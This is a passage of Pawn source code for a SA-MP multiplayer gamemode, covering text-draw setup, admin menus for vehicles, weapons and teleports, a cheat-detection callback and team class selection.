	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
        TeamText[playerid] = TextDrawCreate(7.000000, 428.000000, "General Of Army - Nepal");
		TextDrawBackgroundColor(TeamText[playerid], 255);
		TextDrawFont(TeamText[playerid], 2);
		TextDrawLetterSize(TeamText[playerid], 0.300000, 0.600000);
		TextDrawColor(TeamText[playerid], -1);
		TextDrawSetOutline(TeamText[playerid], 1);
		TextDrawSetProportional(TeamText[playerid], 1);
		//------
		Rank1[playerid] = TextDrawCreate(129.000000,407.000000,"~y~Rank:~w~General of Army ~y~Score:~w~99999~n~~r~Kills:~w~9999 ~r~Deaths:~w~9999");
        TextDrawAlignment(Rank1[playerid],0);
        TextDrawBackgroundColor(Rank1[playerid],0x00000066);
        TextDrawFont(Rank1[playerid],2);
        TextDrawLetterSize(Rank1[playerid],0.199999,1.400000);
        TextDrawColor(Rank1[playerid],0xffffffff);
        TextDrawSetOutline(Rank1[playerid],1);
        TextDrawSetProportional(Rank1[playerid],1);
        TextDrawSetShadow(Rank1[playerid],1);
	    //-------
	    CountText[playerid] = TextDrawCreate(192.000000, 180.000000, "~r~%d/~y~25 ~w~SECONDS ~g~REMAINING");
		TextDrawBackgroundColor(CountText[playerid], 255);
		TextDrawFont(CountText[playerid], 2);
		TextDrawLetterSize(CountText[playerid], 0.660000, 2.900000);
		TextDrawColor(CountText[playerid], -1);
		TextDrawSetOutline(CountText[playerid], 1);
		TextDrawSetProportional(CountText[playerid], 1);

		//*************************************************************************//
	    RankLabel[playerid] = Create3DTextLabel(" ", 0x008080FF, 30.0, 40.0, 50.0, 40.0, 0);
	}
    if(!fexist("ladmin/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin");
		return 1;
	}
	if(!fexist("ladmin/logs/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/logs");
		return 1;
	}
	if(!fexist("ladmin/config/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/config");
		return 1;
	}
	if(!fexist("ladmin/users/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/users");
		return 1;
	}
	UpdateConfig();

	#if defined DISPLAY_CONFIG
	ConfigInConsole();
	#endif

	//===================== [ The Menus ]===========================//
	#if defined USE_MENUS

	LMainMenu = CreateMenu("Main Menu", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LMainMenu, 0, "Choose an option below");
	AddMenuItem(LMainMenu, 0, "Enable");
	AddMenuItem(LMainMenu, 0, "Disable");
    AddMenuItem(LMainMenu, 0, "Server Weather");
    AddMenuItem(LMainMenu, 0, "Server Time");
 	AddMenuItem(LMainMenu, 0, "All Vehicles");
	AddMenuItem(LMainMenu, 0, "Admin Cars");
	AddMenuItem(LMainMenu, 0, "Tuning Menu");
	AddMenuItem(LMainMenu, 0, "Choose Weapon");
	AddMenuItem(LMainMenu, 0, "Teleports");
	AddMenuItem(LMainMenu, 0, "Exit Menu");//

	AdminEnable = CreateMenu("~b~Configuration ~g~ Menu",2, 55.0, 200.0, 150.0, 80.0);
	SetMenuColumnHeader(AdminEnable, 0, "Enable");
	AddMenuItem(AdminEnable, 0, "Anti Swear");
	AddMenuItem(AdminEnable, 0, "Bad Name Kick");
	AddMenuItem(AdminEnable, 0, "Anti Spam");
	AddMenuItem(AdminEnable, 0, "Ping Kick");
	AddMenuItem(AdminEnable, 0, "Read Cmds");
	AddMenuItem(AdminEnable, 0, "Read PMs");
	AddMenuItem(AdminEnable, 0, "Capital Letters");
	AddMenuItem(AdminEnable, 0, "ConnectMessages");
	AddMenuItem(AdminEnable, 0, "AdminCmdMessages");
	AddMenuItem(AdminEnable, 0, "Auto Login");
	AddMenuItem(AdminEnable, 0, "Return");

	AdminDisable = CreateMenu("~b~Configuration ~g~ Menu",2, 55.0, 200.0, 150.0, 80.0);
	SetMenuColumnHeader(AdminDisable, 0, "Disable");
	AddMenuItem(AdminDisable, 0, "Anti Swear");
	AddMenuItem(AdminDisable, 0, "Bad Name Kick");
	AddMenuItem(AdminDisable, 0, "Anti Spam");
	AddMenuItem(AdminDisable, 0, "Ping Kick");
	AddMenuItem(AdminDisable, 0, "Read Cmds");
	AddMenuItem(AdminDisable, 0, "Read PMs");
	AddMenuItem(AdminDisable, 0, "Capital Letters");
	AddMenuItem(AdminDisable, 0, "ConnectMessages");
	AddMenuItem(AdminDisable, 0, "AdminCmdMessages");
	AddMenuItem(AdminDisable, 0, "Auto Login");
	AddMenuItem(AdminDisable, 0, "Return");

	LWeather = CreateMenu("~b~Weather ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LWeather, 0, "Set Weather");
	AddMenuItem(LWeather, 0, "Clear Blue Sky");
	AddMenuItem(LWeather, 0, "Sand Storm");
	AddMenuItem(LWeather, 0, "Thunderstorm");
	AddMenuItem(LWeather, 0, "Foggy");
	AddMenuItem(LWeather, 0, "Cloudy");
	AddMenuItem(LWeather, 0, "High Tide");
	AddMenuItem(LWeather, 0, "Purple Sky");
	AddMenuItem(LWeather, 0, "Black/White Sky");
	AddMenuItem(LWeather, 0, "Dark, Green Sky");
	AddMenuItem(LWeather, 0, "Heatwave");
	AddMenuItem(LWeather,0,"Return");

	LTime = CreateMenu("~b~Time ~g~ Menu", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTime, 0, "Set Time");
	AddMenuItem(LTime, 0, "Morning");
	AddMenuItem(LTime, 0, "Mid day");
	AddMenuItem(LTime, 0, "Afternoon");
	AddMenuItem(LTime, 0, "Evening");
	AddMenuItem(LTime, 0, "Midnight");
    AddMenuItem(LTime, 0, "Return");

	LCars = CreateMenu("~b~LethaL ~g~Cars", 2,  55.0, 150.0, 100.0, 80.0);
	SetMenuColumnHeader(LCars, 0, "Choose a car");
	AddMenuItem(LCars, 0, "Turismo");
	AddMenuItem(LCars, 0, "Bandito");
	AddMenuItem(LCars, 0, "Vortex");
	AddMenuItem(LCars, 0, "NRG");
	AddMenuItem(LCars, 0, "S.W.A.T");
    AddMenuItem(LCars, 0, "Hunter");
    AddMenuItem(LCars, 0, "Jetmax (boat)");
    AddMenuItem(LCars, 0, "Rhino");
    AddMenuItem(LCars, 0, "Monster Truck");
    AddMenuItem(LCars, 0, "Sea Sparrow");
    AddMenuItem(LCars, 0, "More");
	AddMenuItem(LCars, 0, "Return");

	LCars2 = CreateMenu("~b~LethaL ~g~Cars", 2,  55.0, 150.0, 100.0, 80.0);
	SetMenuColumnHeader(LCars2, 0, "Choose a car");
	AddMenuItem(LCars2, 0, "Dumper");
    AddMenuItem(LCars2, 0, "RC Tank");
    AddMenuItem(LCars2, 0, "RC Bandit");
    AddMenuItem(LCars2, 0, "RC Baron");
    AddMenuItem(LCars2, 0, "RC Goblin");
    AddMenuItem(LCars2, 0, "RC Raider");
    AddMenuItem(LCars2, 0, "RC Cam");
    AddMenuItem(LCars2, 0, "Tram");
	AddMenuItem(LCars2, 0, "Return");

	LTuneMenu = CreateMenu("~b~Tuning ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTuneMenu, 0, "Add to car");
	AddMenuItem(LTuneMenu,0,"NOS");
	AddMenuItem(LTuneMenu,0,"Hydraulics");
	AddMenuItem(LTuneMenu,0,"Wire Wheels");
	AddMenuItem(LTuneMenu,0,"Twist Wheels");
	AddMenuItem(LTuneMenu,0,"Access Wheels");
	AddMenuItem(LTuneMenu,0,"Mega Wheels");
	AddMenuItem(LTuneMenu,0,"Import Wheels");
	AddMenuItem(LTuneMenu,0,"Atomic Wheels");
	AddMenuItem(LTuneMenu,0,"Offroad Wheels");
	AddMenuItem(LTuneMenu,0,"Classic Wheels");
	AddMenuItem(LTuneMenu,0,"Paint Jobs");
	AddMenuItem(LTuneMenu,0,"Return");

	PaintMenu = CreateMenu("~b~Paint Job ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(PaintMenu, 0, "Choose paint");
	AddMenuItem(PaintMenu,0,"Paint Job 1");
	AddMenuItem(PaintMenu,0,"Paint Job 2");
	AddMenuItem(PaintMenu,0,"Paint Job 3");
	AddMenuItem(PaintMenu,0,"Paint Job 4");
	AddMenuItem(PaintMenu,0,"Paint Job 5");
	AddMenuItem(PaintMenu,0,"Black");
	AddMenuItem(PaintMenu,0,"White");
	AddMenuItem(PaintMenu,0,"Blue");
	AddMenuItem(PaintMenu,0,"Pink");
	AddMenuItem(PaintMenu,0,"Return");

	LVehicles = CreateMenu("~b~Vehicles ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LVehicles, 0, "Choose a car");
	AddMenuItem(LVehicles,0,"2-door Cars");
	AddMenuItem(LVehicles,0,"4-door Cars");
	AddMenuItem(LVehicles,0,"Fast Cars");
	AddMenuItem(LVehicles,0,"Other Vehicles");
	AddMenuItem(LVehicles,0,"Bikes");
	AddMenuItem(LVehicles,0,"Boats");
	AddMenuItem(LVehicles,0,"Planes");
	AddMenuItem(LVehicles,0,"Helicopters");
	AddMenuItem(LVehicles,0,"Return");

 	twodoor = CreateMenu("~b~2-door Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(twodoor, 0, "Choose a car");
	AddMenuItem(twodoor,0,"Feltzer");//533
	AddMenuItem(twodoor,0,"Stallion");//139
	AddMenuItem(twodoor,0,"Windsor");//555
	AddMenuItem(twodoor,0,"Bobcat");//422
	AddMenuItem(twodoor,0,"Yosemite");//554
	AddMenuItem(twodoor,0,"Broadway");//575
	AddMenuItem(twodoor,0,"Blade");//536
	AddMenuItem(twodoor,0,"Slamvan");//535
	AddMenuItem(twodoor,0,"Tornado");//576
	AddMenuItem(twodoor,0,"Bravura");//401
	AddMenuItem(twodoor,0,"Fortune");//526
	AddMenuItem(twodoor,0,"Return");

 	fourdoor = CreateMenu("~b~4-door Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(fourdoor, 0, "Choose a car");
	AddMenuItem(fourdoor,0,"Perenniel");//404
	AddMenuItem(fourdoor,0,"Tahoma");//566
	AddMenuItem(fourdoor,0,"Voodoo");//412
	AddMenuItem(fourdoor,0,"Admiral");//445
	AddMenuItem(fourdoor,0,"Elegant");//507
	AddMenuItem(fourdoor,0,"Glendale");//466
	AddMenuItem(fourdoor,0,"Intruder");//546
	AddMenuItem(fourdoor,0,"Merit");//551
	AddMenuItem(fourdoor,0,"Oceanic");//467
	AddMenuItem(fourdoor,0,"Premier");//426
	AddMenuItem(fourdoor,0,"Sentinel");//405
	AddMenuItem(fourdoor,0,"Return");

 	fastcar = CreateMenu("~b~Fast Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(fastcar, 0, "Choose a car");
	AddMenuItem(fastcar,0,"Comet");//480
	AddMenuItem(fastcar,0,"Buffalo");//402
	AddMenuItem(fastcar,0,"Cheetah");//415
	AddMenuItem(fastcar,0,"Euros");//587
	AddMenuItem(fastcar,0,"Hotring Racer");//494
	AddMenuItem(fastcar,0,"Infernus");//411
	AddMenuItem(fastcar,0,"Phoenix");//603
	AddMenuItem(fastcar,0,"Super GT");//506
	AddMenuItem(fastcar,0,"Turismo");//451
	AddMenuItem(fastcar,0,"ZR-350");//477
	AddMenuItem(fastcar,0,"Bullet");//541
	AddMenuItem(fastcar,0,"Return");

 	Othercars = CreateMenu("~b~Other Vehicles",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(Othercars, 0, "Choose a car?");
	AddMenuItem(Othercars,0,"Monster Truck");//556
	AddMenuItem(Othercars,0,"Trashmaster");//408
	AddMenuItem(Othercars,0,"Bus");//431
	AddMenuItem(Othercars,0,"Coach");//437
	AddMenuItem(Othercars,0,"Enforcer");//427
	AddMenuItem(Othercars,0,"Rhino (Tank)");//432
	AddMenuItem(Othercars,0,"S.W.A.T.Truck");//601
	AddMenuItem(Othercars,0,"Cement Truck");//524
	AddMenuItem(Othercars,0,"Flatbed");//455
	AddMenuItem(Othercars,0,"BF Injection");//424
	AddMenuItem(Othercars,0,"Dune");//573
	AddMenuItem(Othercars,0,"Return");

 	bikes = CreateMenu("~b~Bikes",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(bikes, 0, "Choose a bike");
	AddMenuItem(bikes,0,"BF-400");
	AddMenuItem(bikes,0,"BMX");
	AddMenuItem(bikes,0,"Faggio");
	AddMenuItem(bikes,0,"FCR-900");
	AddMenuItem(bikes,0,"Freeway");
	AddMenuItem(bikes,0,"NRG-500");
	AddMenuItem(bikes,0,"PCJ-600");
	AddMenuItem(bikes,0,"Pizzaboy");
	AddMenuItem(bikes,0,"Quad");
	AddMenuItem(bikes,0,"Sanchez");
	AddMenuItem(bikes,0,"Wayfarer");
	AddMenuItem(bikes,0,"Return");

 	boats = CreateMenu("~b~Boats",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(boats, 0, "Choose a boat");
	AddMenuItem(boats,0,"Coastguard");//472
	AddMenuItem(boats,0,"Dingy");//473
	AddMenuItem(boats,0,"Jetmax");//493
	AddMenuItem(boats,0,"Launch");//595
	AddMenuItem(boats,0,"Marquis");//484
	AddMenuItem(boats,0,"Predator");//430
	AddMenuItem(boats,0,"Reefer");//453
	AddMenuItem(boats,0,"Speeder");//452
	AddMenuItem(boats,0,"Squallo");//446
	AddMenuItem(boats,0,"Tropic");//454
	AddMenuItem(boats,0,"Return");

 	planes = CreateMenu("~b~Planes",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(planes, 0, "Choose a plane");
	AddMenuItem(planes,0,"Andromada");//592
	AddMenuItem(planes,0,"AT400");//577
	AddMenuItem(planes,0,"Beagle");//511
	AddMenuItem(planes,0,"Cropduster");//512
	AddMenuItem(planes,0,"Dodo");//593
	AddMenuItem(planes,0,"Hydra");//520
	AddMenuItem(planes,0,"Nevada");//553
	AddMenuItem(planes,0,"Rustler");//476
	AddMenuItem(planes,0,"Shamal");//519
	AddMenuItem(planes,0,"Skimmer");//460
	AddMenuItem(planes,0,"Stuntplane");//513
	AddMenuItem(planes,0,"Return");

	helicopters = CreateMenu("~b~Helicopters",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(helicopters, 0, "Choose a helicopter");
	AddMenuItem(helicopters,0,"Cargobob");//
	AddMenuItem(helicopters,0,"Hunter");//
	AddMenuItem(helicopters,0,"Leviathan");//
	AddMenuItem(helicopters,0,"Maverick");//
	AddMenuItem(helicopters,0,"News Chopper");//
	AddMenuItem(helicopters,0,"Police Maverick");//
	AddMenuItem(helicopters,0,"Raindance");//
	AddMenuItem(helicopters,0,"Seasparrow");//
	AddMenuItem(helicopters,0,"Sparrow");//
	AddMenuItem(helicopters,0,"Return");

 	XWeapons = CreateMenu("~b~Weapons ~g~Main Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeapons, 0, "Choose a weapon");
	AddMenuItem(XWeapons,0,"Desert Eagle");//0
	AddMenuItem(XWeapons,0,"M4");
	AddMenuItem(XWeapons,0,"Sawnoff Shotgun");
	AddMenuItem(XWeapons,0,"Combat Shotgun");
	AddMenuItem(XWeapons,0,"UZI");
	AddMenuItem(XWeapons,0,"Rocket Launcher");
	AddMenuItem(XWeapons,0,"Minigun");//6
	AddMenuItem(XWeapons,0,"Sniper Rifle");
	AddMenuItem(XWeapons,0,"Big Weapons");
	AddMenuItem(XWeapons,0,"Small Weapons");//9
	AddMenuItem(XWeapons,0,"More");
	AddMenuItem(XWeapons,0,"Return");//11

 	XWeaponsBig = CreateMenu("~b~Weapons ~g~Big Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsBig,0,"Shotgun");
	AddMenuItem(XWeaponsBig,0,"AK-47");
	AddMenuItem(XWeaponsBig,0,"Country Rifle");
	AddMenuItem(XWeaponsBig,0,"HS Rocket Launcher");
	AddMenuItem(XWeaponsBig,0,"Flamethrower");
	AddMenuItem(XWeaponsBig,0,"SMG");
	AddMenuItem(XWeaponsBig,0,"TEC9");
	AddMenuItem(XWeaponsBig,0,"Return");

 	XWeaponsSmall = CreateMenu("~b~Weapons ~g~Small Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsSmall,0,"9mm");
	AddMenuItem(XWeaponsSmall,0,"Silenced 9mm");
	AddMenuItem(XWeaponsSmall,0,"Molotov Cocktail");
	AddMenuItem(XWeaponsSmall,0,"Fire Extinguisher");
	AddMenuItem(XWeaponsSmall,0,"Spraycan");
	AddMenuItem(XWeaponsSmall,0,"Frag Grenades");
	AddMenuItem(XWeaponsSmall,0,"Katana");
	AddMenuItem(XWeaponsSmall,0,"Chainsaw");
	AddMenuItem(XWeaponsSmall,0,"Return");

 	XWeaponsMore = CreateMenu("~b~Weapons ~g~More Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsMore,0,"Jetpack");
	AddMenuItem(XWeaponsMore,0,"Knife");
	AddMenuItem(XWeaponsMore,0,"Flowers");
	AddMenuItem(XWeaponsMore,0,"Camera");
	AddMenuItem(XWeaponsMore,0,"Pool Cue");
	AddMenuItem(XWeaponsMore,0,"Baseball Bat");
	AddMenuItem(XWeaponsMore,0,"Golf Club");
	AddMenuItem(XWeaponsMore,0,"MAX AMMO");
	AddMenuItem(XWeaponsMore,0,"Return");

	LTele = CreateMenu("Teleports", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTele, 0, "Teleport to where?");
	AddMenuItem(LTele, 0, "Las Venturas");//0
	AddMenuItem(LTele, 0, "Los Santos");//1
	AddMenuItem(LTele, 0, "San Fierro");//2
	AddMenuItem(LTele, 0, "The Desert");//3
	AddMenuItem(LTele, 0, "Flint Country");//4
	AddMenuItem(LTele, 0, "Mount Chiliad");//5
	AddMenuItem(LTele, 0, "Interiors");//6
	AddMenuItem(LTele, 0, "Return");//8

	LasVenturasMenu = CreateMenu("Las Venturas", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LasVenturasMenu, 0, "Teleport to where?");
	AddMenuItem(LasVenturasMenu, 0, "The Strip");//0
	AddMenuItem(LasVenturasMenu, 0, "Come-A-Lot");//1
	AddMenuItem(LasVenturasMenu, 0, "LV Airport");//2
	AddMenuItem(LasVenturasMenu, 0, "KACC Military Fuels");//3
	AddMenuItem(LasVenturasMenu, 0, "Yellow Bell Golf Club");//4
	AddMenuItem(LasVenturasMenu, 0, "Baseball Pitch");//5
	AddMenuItem(LasVenturasMenu, 0, "Return");//6

	LosSantosMenu = CreateMenu("Los Santos", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LosSantosMenu, 0, "Teleport to where?");
	AddMenuItem(LosSantosMenu, 0, "Ganton");//0
	AddMenuItem(LosSantosMenu, 0, "LS Airport");//1
	AddMenuItem(LosSantosMenu, 0, "Ocean Docks");//2
	AddMenuItem(LosSantosMenu, 0, "Pershing Square");//3
	AddMenuItem(LosSantosMenu, 0, "Verdant Bluffs");//4
	AddMenuItem(LosSantosMenu, 0, "Santa Maria Beach");//5
	AddMenuItem(LosSantosMenu, 0, "Mulholland");//6
	AddMenuItem(LosSantosMenu, 0, "Richman");//7
	AddMenuItem(LosSantosMenu, 0, "Return");//8

	SanFierroMenu = CreateMenu("San Fierro", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(SanFierroMenu, 0, "Teleport to where?");
	AddMenuItem(SanFierroMenu, 0, "SF Station");//0
	AddMenuItem(SanFierroMenu, 0, "SF Airport");//1
	AddMenuItem(SanFierroMenu, 0, "Ocean Flats");//2
	AddMenuItem(SanFierroMenu, 0, "Avispa Country Club");//3
	AddMenuItem(SanFierroMenu, 0, "Easter Basin (docks)");//4
	AddMenuItem(SanFierroMenu, 0, "Esplanade North");//5
	AddMenuItem(SanFierroMenu, 0, "Battery Point");//6
	AddMenuItem(SanFierroMenu, 0, "Return");//7

	DesertMenu = CreateMenu("The Desert", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(DesertMenu, 0, "Teleport to where?");
	AddMenuItem(DesertMenu, 0, "Aircraft Graveyard");//0
	AddMenuItem(DesertMenu, 0, "Area 51");//1
	AddMenuItem(DesertMenu, 0, "The Big Ear");//2
	AddMenuItem(DesertMenu, 0, "The Sherman Dam");//3
	AddMenuItem(DesertMenu, 0, "Las Barrancas");//4
	AddMenuItem(DesertMenu, 0, "El Quebrados");//5
	AddMenuItem(DesertMenu, 0, "Octane Springs");//6
	AddMenuItem(DesertMenu, 0, "Return");//7

	FlintMenu = CreateMenu("Flint Country", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(FlintMenu, 0, "Teleport to where?");
	AddMenuItem(FlintMenu, 0, "The Lake");//0
	AddMenuItem(FlintMenu, 0, "Leafy Hollow");//1
	AddMenuItem(FlintMenu, 0, "The Farm");//2
	AddMenuItem(FlintMenu, 0, "Shady Cabin");//3
	AddMenuItem(FlintMenu, 0, "Flint Range");//4
	AddMenuItem(FlintMenu, 0, "Becon Hill");//5
	AddMenuItem(FlintMenu, 0, "Fallen Tree");//6
	AddMenuItem(FlintMenu, 0, "Return");//7

	MountChiliadMenu = CreateMenu("Mount Chiliad", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(MountChiliadMenu, 0, "Teleport to where?");
	AddMenuItem(MountChiliadMenu, 0, "Chiliad Jump");//0
	AddMenuItem(MountChiliadMenu, 0, "Bottom Of Chiliad");//1
	AddMenuItem(MountChiliadMenu, 0, "Highest Point");//2
	AddMenuItem(MountChiliadMenu, 0, "Chiliad Path");//3
	AddMenuItem(MountChiliadMenu, 0, "Return");//7

	InteriorsMenu = CreateMenu("Interiors", 2,  55.0, 200.0, 130.0, 80.0);
	SetMenuColumnHeader(InteriorsMenu, 0, "Teleport to where?");
	AddMenuItem(InteriorsMenu, 0, "Planning Department");//0
	AddMenuItem(InteriorsMenu, 0, "LV PD");//1
	AddMenuItem(InteriorsMenu, 0, "Pizza Stack");//2
	AddMenuItem(InteriorsMenu, 0, "RC Battlefield");//3
	AddMenuItem(InteriorsMenu, 0, "Caligula's Casino");//4
	AddMenuItem(InteriorsMenu, 0, "Big Smoke's Crack Palace");//5
	AddMenuItem(InteriorsMenu, 0, "Madd Dogg's Mansion");//6
	AddMenuItem(InteriorsMenu, 0, "Dirtbike Stadium");//7
	AddMenuItem(InteriorsMenu, 0, "Vice Stadium (duel)");//8
	AddMenuItem(InteriorsMenu, 0, "Ammu-nation");//9
	AddMenuItem(InteriorsMenu, 0, "Atrium");//7
	AddMenuItem(InteriorsMenu, 0, "Return");//8
	#endif

	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) OnPlayerConnect(i);
	for(new i = 1; i < MAX_CHAT_LINES; i++) Chat[i] = "<none>";
	for(new i = 1; i < MAX_REPORTS; i++) Reports[i] = "<none>";

	return 1;
}

public OnPlayerCleoDetected( playerid, cleoid )
{
    switch( cleoid )
    {
        case CLEO_FAKEKILL:
        {
            SendClientMessage( playerid, -1, "You are fake killing." );
        }
        case CLEO_CARWARP:
        {
            SendClientMessage( playerid, -1, "You are car warping." );
        }
        case CLEO_CAR_PARTICLE_SPAM:
        {
            SendClientMessage( playerid, -1, "You are partical spamming" );
        }
    }
    return 1;
}
stock IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
    new Float:X, Float:Y, Float:Z;

    GetPlayerPos(playerid, X, Y, Z);
    if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY) {
        return 1;
    }
    return 0;
}

/*stock SendBoxMessage(playerid, const text[])
{
    for(new line; line < 15; line++)
    {
        TextDrawShowForPlayer(playerid, Message[line]);
    }
    for(new line; line < 15; line++)
    {
        TextDrawHideForAll(Message[line]);
        if(line < 14)
        {
            MessageStr[line] = MessageStr[line+1];
            TextDrawSetString(Message[line], MessageStr[line]);
        }
    }
    format(MessageStr[8], 128, "%s",text);
    TextDrawSetString(Message[8], MessageStr[8]);
    for(new line; line < 15; line++)
    {
        TextDrawShowForAll(Message[line]);
    }
    return 1;
}
*/

public OnGameModeExit()
{
	//=======
	SaveStats();
	#if defined USE_MENUS
	DestroyAllMenus();
	#endif
	return 1;
}

public SaveStats()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		SendClientMessage(i, green,"Everyone's status has been automatically saved!");
		SavePlayer(i);
	}
	return 1;
}

forward RandomMessage();
public RandomMessage()
{
	SendClientMessageToAll(-1, RandomMessages[random(sizeof(RandomMessages))]);
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    TextDrawHideForPlayer(playerid, Rules);
    TextDrawHideForPlayer(playerid, StartLogo);
    /*TextDrawHideForPlayer(playerid, startbox);
    TextDrawHideForPlayer(playerid, welcome);
    TextDrawHideForPlayer(playerid, to);
    TextDrawHideForPlayer(playerid, advance);
    TextDrawHideForPlayer(playerid, copyright);*/
	Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x,y,z);
	switch(classid)
	{
		case 0:
		{
			// PAKISTAN //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, ML);
			gTeam[playerid] = TEAM_PAKISTAN;
			SetPlayerTeam(playerid, 0);
			SetPlayerSkin(playerid, 294);
			SetPlayerColor(playerid, TEAM_PAKISTAN_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 1:
		{
			// INDIA INVASION //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, ML);
			SetPlayerTeam(playerid, 1);
			SetPlayerSkin(playerid, 125);
			gTeam[playerid] = TEAM_INDIA;
			SetPlayerColor(playerid, TEAM_INDIA_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 2:
		{
			// China //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawShowForPlayer(playerid, S);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, ML);
			SetPlayerSkin(playerid, 123);
			SetPlayerTeam(playerid, 2);
			gTeam[playerid] = TEAM_CHINA;
			SetPlayerColor(playerid, TEAM_CHINA_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 3:
		{
			// USA //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, ML);
			SetPlayerTeam(playerid, 5);
			SetPlayerSkin(playerid, 287);
			gTeam[playerid] = TEAM_USA;
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 4:
		{
			// Nepal //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, ML);
			SetPlayerTeam(playerid, 4);
			SetPlayerSkin(playerid, 174);
			gTeam[playerid] = TEAM_NEPAL;
